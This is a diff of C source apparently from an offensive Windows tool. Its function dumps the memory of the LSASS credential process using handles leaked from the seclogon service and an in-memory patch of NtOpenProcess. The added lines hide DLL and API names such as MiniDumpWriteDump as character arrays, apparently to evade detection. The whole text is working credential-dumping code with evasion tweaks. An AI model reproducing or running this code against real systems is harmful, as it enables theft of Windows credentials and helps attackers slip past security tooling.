@@ -338,14 +338,18 @@ void RestoreNtOpenProcess(char* oldCode, int oldCodeSize) {
 }
 
 void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL useLsassClone) {
+	wchar_t dbgcoreStr[] = {L'd', L'b', L'g', L'c', L'o', L'r', L'e', L'.', L'd', L'l', L'l', 0x00, 0x00};
+	wchar_t ntdllStr[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0x00, 0x00 };
+	char MiniDumpWriteDumpStr[] = { 'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0x00 };
+	char NtCreateProcessExStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'E', 'x', 0x00 };
 	pMiniDumpWriteDump MiniDumpWriteDump = NULL;
 	pNtCreateProcessEx NtCreateProcessEx = NULL;
 	char oldCode[15];
 	int oldCodeSize;
 	HANDLE hLeakedHandleFullAccess = NULL, hLsassClone = NULL, hLsass = NULL;
 	RtlZeroMemory(oldCode, 15);
-	MiniDumpWriteDump = (pMiniDumpWriteDump)GetProcAddress(LoadLibrary(L"Dbghelp.dll"), "MiniDumpWriteDump");
-	if (useLsassClone) NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtCreateProcessEx");
+	MiniDumpWriteDump = (pMiniDumpWriteDump)GetProcAddress(LoadLibrary(dbgcoreStr), MiniDumpWriteDumpStr);
+	if (useLsassClone) NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(LoadLibrary(ntdllStr), NtCreateProcessExStr);
 	// now we expect to have leaked handles in our current process. Even if the seclogon can duplicate 3 handles at a time it seems it duplicates each one 2 times, so total handles = 6
 	for (__int64 leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4) {
 		if (GetProcessId((HANDLE)leakedHandle) == lsassPid) {
@@ -365,9 +369,9 @@ void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL
 			}
 			else
 				hLsass = (HANDLE)leakedHandle;
-			// we ensure no one will close the handle, it seems RtlQueryProcessDebugInformation() try to close it
+			// we ensure no one will close the handle, it seems RtlQueryProcessDebugInformation() called from MiniDumpWriteDump() try to close it
 			SetHandleInformation(hLsass, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
-			// we need to patch NtOpenProcess because MiniDumpWriteDump would open a new handle to lsass and we want to avoid that
+			// we need to patch NtOpenProcess because MiniDumpWriteDump() would open a new handle to lsass and we want to avoid that
 			ReplaceNtOpenProcess((HANDLE)hLsass, oldCode, &oldCodeSize);
 			BOOL result = MiniDumpWriteDump((HANDLE)hLsass, GetProcessId(hLsass), hFileDmp, MiniDumpWithFullMemory, NULL, NULL, NULL);
 			RestoreNtOpenProcess(oldCode, oldCodeSize);
